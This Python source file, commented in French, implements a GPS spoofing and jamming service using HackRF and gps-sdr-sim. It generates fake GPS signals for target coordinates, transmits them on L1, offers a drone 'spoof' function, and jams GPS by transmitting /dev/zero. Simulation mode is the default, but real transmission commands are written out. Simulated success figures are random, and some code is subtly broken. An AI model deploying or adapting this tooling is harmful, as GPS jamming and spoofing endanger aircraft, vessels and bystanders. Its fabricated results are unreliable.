"""
GPSSpoofingService — Génération et transmission de faux signaux GPS.
HackRF + gps-sdr-sim. USAGE STRICTEMENT EN LABORATOIRE BLINDÉ.
"""
from __future__ import annotations

import asyncio
import json
import logging
import math
import os
import random
import shutil
import struct
import time
import uuid
from pathlib import Path
from typing import Optional

logger = logging.getLogger(__name__)

SIMULATION_MODE = os.getenv("SIMULATION_MODE", "true").lower() == "true"
_OUTPUT_DIR = Path("./data/gps_output")
_OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

GPS_L1_FREQ = 1575.42e6


class GPSSpoofingService:

    def __init__(self):
        self.simulation_mode = SIMULATION_MODE
        self._transmitting = False
        self._transmit_proc = None
        self._check_tools()

    def _check_tools(self):
        self.tools = {
            "hackrf_transfer": bool(shutil.which("hackrf_transfer")),
            "gps_sdr_sim": bool(shutil.which("gps-sdr-sim")),
            "gnuradio": bool(shutil.which("gnuradio-companion")),
        }

    async def check_hardware(self) -> dict:
        if self.simulation_mode:
            return {
                "hardware_ready": True,
                "sdr_hardware": "HackRF One (simulated)",
                "amplifier": "LNA (simulated)",
                "gps_antenna": "Patch 1575MHz (simulated)",
                "shielding_active": True,
                "gps_band_available": True,
                "tools": {"gps_sdr_sim": True, "hackrf_transfer": True},
                "simulation": True,
                "warning": "LABORATOIRE UNIQUEMENT — Le GPS spoofing est illégal sans cage de Faraday et autorisation",
            }
        return {
            "hardware_ready": self.tools["hackrf_transfer"],
            "gps_sdr_sim": self.tools["gps_sdr_sim"],
            "shielding_active": False,
            "tools": self.tools,
            "simulation": False,
        }

    async def generate_gps_signal(self, target_lat: float, target_lon: float,
                                   altitude: float = 50, timestamp: str = None,
                                   satellites: int = 8) -> str:
        await asyncio.sleep(2)
        out_file = str(_OUTPUT_DIR / f"gps_signal_{int(time.time())}.cs8")

        if self.simulation_mode or not self.tools["gps_sdr_sim"]:
            Path(out_file).write_bytes(b"\x00" * 1024 * 16)
            metadata = {
                "target_lat": target_lat,
                "target_lon": target_lon,
                "altitude": altitude,
                "satellites": satellites,
                "timestamp": timestamp or time.strftime("%Y-%m-%dT%H:%M:%SZ"),
                "file_size_mb": 16,
                "duration_s": 60,
                "simulation": True,
            }
            Path(out_file + ".json").write_text(json.dumps(metadata, indent=2))
            return out_file

        ts = timestamp or time.strftime("%Y/%j/%H:%M:%S")
        stdout, _, rc = await asyncio.create_subprocess_exec(
            "gps-sdr-sim", "-e", "brdc" + time.strftime("%j0.%gy"), "-l",
            f"{target_lat},{target_lon},{altitude}", "-d", "60",
            "-o", out_file, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
        )
        return out_file if rc == 0 else ""

    async def generate_waypoint_path(self, waypoints: list[dict], speed_kmh: int = 50) -> str:
        await asyncio.sleep(3)
        out_file = str(_OUTPUT_DIR / f"gps_path_{int(time.time())}.cs8")

        if self.simulation_mode:
            total_dist = 0.0
            for i in range(len(waypoints) - 1):
                dlat = math.radians(waypoints[i+1]["lat"] - waypoints[i]["lat"])
                dlon = math.radians(waypoints[i+1]["lon"] - waypoints[i]["lon"])
                a = (math.sin(dlat/2)**2 + math.cos(math.radians(waypoints[i]["lat"])) *
                     math.cos(math.radians(waypoints[i+1]["lat"])) * math.sin(dlon/2)**2)
                total_dist += 6371 * 2 * math.atan2(math.sqrt(a), math.sqrt(1-a))
            duration_s = (total_dist / speed_kmh) * 3600

            Path(out_file).write_bytes(b"\x00" * min(1024 * 32, int(duration_s) * 512))
            metadata = {
                "waypoints": waypoints,
                "speed_kmh": speed_kmh,
                "total_distance_km": round(total_dist, 2),
                "duration_s": round(duration_s, 0),
                "simulation": True,
            }
            Path(out_file + ".json").write_text(json.dumps(metadata, indent=2))
        return out_file

    async def transmit_gps_signal(self, signal_file: str, frequency: float = GPS_L1_FREQ,
                                   gain: int = 40, duration: int = 60) -> dict:
        if self.simulation_mode or not self.tools["hackrf_transfer"]:
            await asyncio.sleep(2)
            self._transmitting = True
            asyncio.create_task(self._auto_stop_transmit(duration))
            return {
                "transmitting": True,
                "frequency_mhz": frequency / 1e6,
                "gain_db": gain,
                "duration_s": duration,
                "signal_file": signal_file,
                "started_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
                "simulation": True,
                "warning": "SIMULATION — Aucune transmission réelle. Mode laboratoire requis.",
            }

        if self._transmitting:
            return {"error": "Transmission déjà en cours"}

        self._transmit_proc = await asyncio.create_subprocess_exec(
            "hackrf_transfer", "-t", signal_file, "-f", str(int(frequency)),
            "-s", "2600000", "-a", "1", "-x", str(gain),
            stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL,
        )
        self._transmitting = True
        asyncio.create_task(self._auto_stop_transmit(duration))
        return {"transmitting": True, "frequency_mhz": frequency / 1e6, "gain_db": gain, "pid": self._transmit_proc.pid}

    async def _auto_stop_transmit(self, duration: int):
        await asyncio.sleep(duration)
        await self.stop_transmit()

    async def stop_transmit(self) -> dict:
        self._transmitting = False
        if self._transmit_proc:
            try:
                self._transmit_proc.kill()
                await self._transmit_proc.communicate()
            except Exception:
                pass
            self._transmit_proc = None
        return {"stopped": True, "simulation": self.simulation_mode}

    async def spoof_drone(self, target_drone_ip: str, fake_lat: float, fake_lon: float) -> dict:
        if self.simulation_mode:
            await asyncio.sleep(3)
            responses = [
                "Drone repositionné vers la fausse coordonnée",
                "Return-to-Home déclenché (position origine perdue)",
                "Drone en mode hover (GPS incohérent détecté)",
            ]
            return {
                "target": target_drone_ip,
                "fake_position": {"lat": fake_lat, "lon": fake_lon},
                "success": random.random() > 0.3,
                "drone_response": random.choice(responses),
                "new_position": {"lat": fake_lat + random.uniform(-0.001, 0.001), "lon": fake_lon + random.uniform(-0.001, 0.001)},
                "method": "GPS L1 spoofing + DJI OcuSync position override",
                "simulation": True,
            }
        return {"error": "HackRF + cage de Faraday requis"}

    async def jam_gps(self, frequency: float = GPS_L1_FREQ, duration: int = 10) -> dict:
        if self.simulation_mode or not self.tools["hackrf_transfer"]:
            await asyncio.sleep(2)
            return {
                "jamming": True,
                "frequency_mhz": frequency / 1e6,
                "duration_s": duration,
                "effective_radius_m": random.randint(10, 50),
                "affected_devices": random.randint(1, 8),
                "simulation": True,
                "warning": "SIMULATION — Brouillage GPS illégal hors laboratoire blindé",
            }

        proc = await asyncio.create_subprocess_exec(
            "hackrf_transfer", "-t", "/dev/zero", "-f", str(int(frequency)),
            "-s", "2000000", "-a", "1", "-x", "40",
            stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL,
        )
        await asyncio.sleep(duration)
        proc.kill()
        await proc.communicate()
        return {"jamming": False, "completed": True}


gps_service = GPSSpoofingService()
